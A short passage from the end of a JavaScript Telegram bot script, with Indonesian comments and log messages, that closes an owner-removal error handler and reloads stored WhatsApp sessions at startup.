    console.error("Error removing owner:", error);
  }
});

// Memuat ulang sesi WhatsApp saat bot start
(async () => {
  console.log(chalk.cyan("🚀 Memulai bot Telegram..."));
  await reloadAllWhatsAppSessions();
  console.log(chalk.green("✅ Bot siap digunakan!"));
})();

console.log(chalk.green("✅ Bot Telegram berhasil dijalankan!"));